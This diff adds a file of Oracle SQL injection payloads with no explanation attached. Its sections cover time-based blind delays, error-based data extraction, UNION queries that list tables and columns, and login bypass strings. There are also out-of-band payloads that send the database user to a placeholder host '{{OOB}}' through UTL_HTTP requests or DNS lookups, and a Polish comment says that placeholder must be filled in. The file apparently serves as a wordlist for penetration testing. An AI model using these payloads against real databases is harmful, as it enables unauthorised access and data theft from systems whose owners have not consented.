@@ -1,0 +1,21 @@
+# === Time-based blind ===
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
+' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
+
+# === Error-based extraction ===
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -
+' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
+
+# === UNION (FROM dual is mandatory) ===
+' UNION SELECT banner,NULL,NULL FROM v$version-- -
+' UNION SELECT table_name,NULL,NULL FROM all_tables-- -
+' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'-- -
+
+# === Out-of-band (UTL_HTTP / UTL_INADDR) ===
+# Wymagana podmiana {{OOB}}
+' AND UTL_HTTP.REQUEST('http://{{OOB}}/'||(SELECT user FROM dual)) IS NOT NULL-- -
+' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{{OOB}}') IS NOT NULL-- -
+
+# === Login bypass ===
+' OR 1=1-- -
+admin'-- -
